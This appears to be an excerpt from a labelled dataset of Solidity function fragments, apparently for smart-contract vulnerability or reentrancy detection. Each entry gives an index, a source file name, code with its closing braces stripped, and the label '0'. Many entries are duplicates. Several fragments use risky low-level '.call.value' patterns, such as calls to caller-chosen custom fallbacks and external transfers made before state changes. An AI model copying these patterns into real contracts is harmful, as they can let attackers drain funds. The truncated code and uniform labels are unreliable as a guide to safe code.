plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000)  {
uint256 _keys = (round[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000)   {
updateTimer(_keys, _rID);
if (round[_rID].plyr != _pID)
round[_rID].plyr = _pID;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000)  {
airDropTracker_++;
if (airdrop() == true)  {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 100000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds[_pID][_rID].keys = _keys.add(plyrRnds[_pID][_rID].keys);
plyrRnds[_pID][_rID].eth = _eth.add(plyrRnds[_pID][_rID].eth);
round[_rID].keys = _keys.add(round[_rID].keys);
round[_rID].eth = _eth.add(round[_rID].eth);
_eventData_ = distributeExternal(_pID, _eth, _affID, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _keys, _eventData_);
endTx(_pID, _eth, _keys, _eventData_);
plyrRnds_[_pID] = plyrRnds[_pID][_rID];
round_ = round[_rID];
0
---------------------------------
680 774.sol
function distributeExternal(uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_) private returns(FDDdatasets.EventReturns) {
uint256 _com = _eth * 5 / 100;
uint256 _aff = _eth * 10 / 100;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit FDDEvents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _pID, _aff, now);
} else {
_com += _aff;
if (!address(Bank).call.value(_com)(bytes4(keccak256("deposit()"))))  {  }
return(_eventData_);
function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_)  private  {
if (plyrRnds[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round[_rID].eth < 100000000000000000000 && plyrRnds[_pID][_rID].eth.add(_eth) > 10000000000000000000)  {
uint256 _availableLimit = (10000000000000000000).sub(plyrRnds[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000)  {
uint256 _keys = (round[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000)   {
updateTimer(_keys, _rID);
if (round[_rID].plyr != _pID)
round[_rID].plyr = _pID;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000)  {
airDropTracker_++;
if (airdrop() == true)  {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 100000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds[_pID][_rID].keys = _keys.add(plyrRnds[_pID][_rID].keys);
plyrRnds[_pID][_rID].eth = _eth.add(plyrRnds[_pID][_rID].eth);
round[_rID].keys = _keys.add(round[_rID].keys);
round[_rID].eth = _eth.add(round[_rID].eth);
_eventData_ = distributeExternal(_pID, _eth, _affID, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _keys, _eventData_);
endTx(_pID, _eth, _keys, _eventData_);
plyrRnds_[_pID] = plyrRnds[_pID][_rID];
round_ = round[_rID];
0
---------------------------------
681 36645.sol
function purchase_tokens() {
require(msg.sender == developer);
if (this.balance < eth_minimum) return;
if (kill_switch) return;
require(sale != 0x0);
bought_tokens = true;
contract_eth_value = this.balance;
require(sale.call.value(contract_eth_value)());
require(this.balance==0);
0
---------------------------------
682 7530.sol
function execute(address _to, uint _value, bytes _data) external onlyOwner {
SingleTransact(msg.sender, _value, _to, _data);
_to.call.value(_value)(_data);
0
---------------------------------
683 7530.sol
function execute(address _to, uint _value, bytes _data) external onlyOwner {
SingleTransact(msg.sender, _value, _to, _data);
_to.call.value(_value)(_data);
0
---------------------------------
684 7530.sol
function execute(address _to, uint _value, bytes _data) external onlyOwner {
SingleTransact(msg.sender, _value, _to, _data);
_to.call.value(_value)(_data);
0
---------------------------------
685 7530.sol
function execute(address _to, uint _value, bytes _data) external onlyOwner {
SingleTransact(msg.sender, _value, _to, _data);
_to.call.value(_value)(_data);
0
---------------------------------
686 7530.sol
function execute(address _to, uint _value, bytes _data) external onlyOwner {
SingleTransact(msg.sender, _value, _to, _data);
_to.call.value(_value)(_data);
0
---------------------------------
687 29601.sol
function transferInternal(address from, address to, uint256 value, bytes data, bool useCustomFallback, string customFallback) internal returns (bool success) {
bool status = super.transferInternal(from, to, value);
if (status) {
if (isContract(to)) {
ContractReceiver receiver = ContractReceiver(to);
if (useCustomFallback) {
require(receiver.call.value(0)(bytes4(keccak256(customFallback)), from, value, data) == true);
} else {
receiver.tokenFallback(from, value, data);
Transfer(from, to, value, data);
return status;
function transfer(address to, uint value, bytes data, string customFallback) public returns (bool success) {
require(locked == false);
bool status = transferInternal(msg.sender, to, value, data, true, customFallback);
return status;
function transferInternal(address from, address to, uint256 value, bytes data) internal returns (bool success) {
return transferInternal(from, to, value, data, false, "");
function transferInternal(address from, address to, uint256 value) internal returns (bool success) {
require(locked == false);
bytes memory data;
return transferInternal(from, to, value, data, false, "");
function claimableTransfer(uint256 _time, address _from,address _to, uint256 _value, bytes _data, bool _useCustomFallback, string _customFallback) internal returns (bool success)
uint256 senderCurrentBalance = balanceOf(_from);
uint256 receiverCurrentBalance = balanceOf(_to);
uint256 _totalSupply = totalSupply();
bool status = super.transferInternal(_from, _to, _value, _data, _useCustomFallback, _customFallback);
require(status);
claimInternal(_time, _from, senderCurrentBalance, _totalSupply);
claimInternal(_time, _to, receiverCurrentBalance, _totalSupply);
return true;
0
---------------------------------
688 14741.sol
function transferToContractWithCustomFallback(address _to, uint _value, bytes _data, string _custom_fallback) private returns(bool success) {
require(balanceOf(msg.sender) > _value);
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
emit Transfer(msg.sender, _to, _value, _data);
return true;
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns(bool success) {
require(!frozenAccount[msg.sender]);
require(!frozenAccount[_to]);
if (isContract(_to)) {
return transferToContractWithCustomFallback(_to, _value, _data, _custom_fallback);
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
689 14741.sol
function transferToContractWithCustomFallback(address _to, uint _value, bytes _data, string _custom_fallback) private returns(bool success) {
require(balanceOf(msg.sender) > _value);
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
emit Transfer(msg.sender, _to, _value, _data);
return true;
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns(bool success) {
require(!frozenAccount[msg.sender]);
require(!frozenAccount[_to]);
if (isContract(_to)) {
return transferToContractWithCustomFallback(_to, _value, _data, _custom_fallback);
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
690 14741.sol
function transferToContractWithCustomFallback(address _to, uint _value, bytes _data, string _custom_fallback) private returns(bool success) {
require(balanceOf(msg.sender) > _value);
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
emit Transfer(msg.sender, _to, _value, _data);
return true;
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns(bool success) {
require(!frozenAccount[msg.sender]);
require(!frozenAccount[_to]);
if (isContract(_to)) {
return transferToContractWithCustomFallback(_to, _value, _data, _custom_fallback);
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
691 2301.sol
function executeOrder(bytes32 _data, uint _value, address _target) public onlyGovernor {
_target.call.value(_value)(_data);
0
---------------------------------
692 2301.sol
function executeOrder(bytes32 _data, uint _value, address _target) public onlyGovernor {
_target.call.value(_value)(_data);
0
---------------------------------
693 2301.sol
function executeOrder(bytes32 _data, uint _value, address _target) public onlyGovernor {
_target.call.value(_value)(_data);
0
---------------------------------
694 12454.sol
function submitPool(uint256 weiAmount) public onlyAdmin noReentrancy {
require(contractStage < CONTRACT_SUBMIT_FUNDS, "Cannot resubmit pool.");
require(receiverAddress != 0x00, "receiver address cannot be empty");
uint256 contractBalance = address(this).balance;
if(weiAmount == 0){
weiAmount = contractBalance;
require(minContribution <= weiAmount && weiAmount <= contractBalance, "submitted amount too small or larger than the balance");
finalBalance = contractBalance;
require(receiverAddress.call.value(weiAmount).gas(gasleft().sub(5000))(),"Error submitting pool to receivingAddress");
contractBalance = address(this).balance;
if(contractBalance > 0) {
ethRefundAmount.push(contractBalance);
contractStage = CONTRACT_SUBMIT_FUNDS;
emit PoolSubmitted(receiverAddress, weiAmount);
0
---------------------------------
695 12454.sol
function submitPool(uint256 weiAmount) public onlyAdmin noReentrancy {
require(contractStage < CONTRACT_SUBMIT_FUNDS, "Cannot resubmit pool.");
require(receiverAddress != 0x00, "receiver address cannot be empty");
uint256 contractBalance = address(this).balance;
if(weiAmount == 0){
weiAmount = contractBalance;
require(minContribution <= weiAmount && weiAmount <= contractBalance, "submitted amount too small or larger than the balance");
finalBalance = contractBalance;
require(receiverAddress.call.value(weiAmount).gas(gasleft().sub(5000))(),"Error submitting pool to receivingAddress");
contractBalance = address(this).balance;
if(contractBalance > 0) {
ethRefundAmount.push(contractBalance);
contractStage = CONTRACT_SUBMIT_FUNDS;
emit PoolSubmitted(receiverAddress, weiAmount);
0
---------------------------------
696 35661.sol
function refund() stopInEmergency {
if(getState() != State.Refunding) throw;
address investor = msg.sender;
if(balances[investor] == 0) throw;
uint amount = balances[investor];
delete balances[investor];
if(!(investor.call.value(amount)())) throw;
Refunded(investor, amount);
0
---------------------------------
697 35661.sol
function refund() stopInEmergency {
if(getState() != State.Refunding) throw;
address investor = msg.sender;
if(balances[investor] == 0) throw;
uint amount = balances[investor];
delete balances[investor];
if(!(investor.call.value(amount)())) throw;
Refunded(investor, amount);
0
---------------------------------
698 35661.sol
function refund() stopInEmergency {
if(getState() != State.Refunding) throw;
address investor = msg.sender;
if(balances[investor] == 0) throw;
uint amount = balances[investor];
delete balances[investor];
if(!(investor.call.value(amount)())) throw;
Refunded(investor, amount);
0
---------------------------------
699 35661.sol
function refund() stopInEmergency {
if(getState() != State.Refunding) throw;
address investor = msg.sender;
if(balances[investor] == 0) throw;
uint amount = balances[investor];
delete balances[investor];
if(!(investor.call.value(amount)())) throw;
Refunded(investor, amount);
0
---------------------------------
700 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
701 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
702 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
703 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
704 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
705 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
706 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
707 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
708 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
709 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
710 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
711 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
712 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
713 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
714 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
715 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
716 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
717 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
718 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
719 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
720 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
721 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
722 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
723 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
724 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
725 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
726 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
727 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
728 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
729 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
730 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
731 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
732 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
733 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
734 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
735 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
736 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
